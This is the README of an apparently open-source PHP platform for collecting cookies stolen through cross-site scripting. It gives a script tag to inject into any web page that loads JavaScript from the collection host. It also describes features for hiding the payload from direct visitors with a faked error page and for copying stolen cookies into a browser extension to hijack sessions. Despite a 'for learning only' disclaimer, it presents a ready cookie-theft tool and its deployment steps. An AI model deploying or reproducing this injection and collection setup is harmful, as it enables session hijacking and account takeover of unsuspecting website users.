# xss个人攻击测试cookie管理平台
php写的个人研究测试用的  xss cookie 攻击管理平台,开源出来
<p>由于在实际测试中需要非常高的执行速度，所以并没有采用框架</p>

![image](https://raw.githubusercontent.com/keyus/xss/master/xss_demo.png)

<h2>本地测试</h2>
<p>虚拟主机域名:xs.com</p>
<code>
&lt;script src="//xs.com"&gt;&lt;/script&gt;
</code>
<p>任意网页中插入以上代码</p>

<h2>仅用于学习交流，禁止用于非法行为，后果自付</h2>

<h2>目录结构</h2>

<pre><code>www  WEB部署目录（或者子目录）
├─admin                 后台目录
│  ├─api.php            删除记录，与改变数据状态的请求
│  ├─auth.php           登录认证
│  ├─function.php       分页类与日期格化函数
│  ├─login.php          后台登陆
│  └─web.php            后台管理主页
|  
├─asset                 资源目录
│  ├─common.css         样式文件
│  └─error.gif          图标
│  
├─mailer                邮件类,本项目中默认未使用到可删除
│
├─cnzz.php              xs接收地址文件,用于把接收到的cookie送入数据库
├─config.php            配置文件，配置后台登录用户名，密码，数据库,以及表名
├─index.php             网站首页
└─xss.sql               默认数据库，自行导入


</code></pre>

<h2>使用</h2>
<ul>
<li>  导入xss.sql到数据库</li>
<li>  正确的配置config.php</li>
<li>  虚拟主机的默认首页名，指向index.php</li>
<li>  正确的配置index.php中 js代码的接收地址,为了提高运行速度并没有在config中配置xs接收地址</li>
</ul>


<h2>功能</h2>

<ul>
<li>  浏览器访问主页，检测HTTP_REFERER,直接地址栏输入访问，返回错误提示 伪装</li>
<li>  只有在源代码中点击script链接才能查看到js代码</li>
<li>  后台管理中心点击[cookie]可以一键复制，导入到editthiscookie等工具中使用</li>
</ul>


<h2>So 然而并卵</h2>
当今的互联网对xss的防范已经做得比较到位了，一般稍微像样点儿的框架都做了防护。只有测试一些古老的asp,或者一些程序员偷懒不做过滤的



